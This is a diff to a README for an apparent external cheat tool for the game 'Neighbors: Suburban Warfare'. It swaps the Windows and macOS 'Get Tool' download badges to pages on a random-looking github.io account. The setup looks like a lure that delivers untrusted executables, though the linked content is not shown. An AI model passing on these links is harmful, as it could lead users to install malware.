@@ -12,7 +12,7 @@
 
 [![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/wivoxsxdivwo/neighbors-suburban-warfare-external)
 
-[![Get Tool](https://img.shields.io/badge/⬇️_Get_Tool-FF4444?style=for-the-badge&logoColor=white)](https://WaterCongressman.github.io/win-download/)
+[![Get Tool](https://img.shields.io/badge/⬇️_Get_Tool-FF4444?style=for-the-badge&logoColor=white)](https://iloqhmlhfppl.github.io/win-get2/)
 
 ![Neighbors: Suburban Warfare External](game.jpg)
 
@@ -75,7 +75,7 @@ Neighbors: Suburban Warfare is a competitive team strategy game where two neighb
 
 ## 🍎 macOS
 
-[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
+[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://iloqhmlhfppl.github.io/mac-download2/)
 
 ## ⚖️ Legal
 
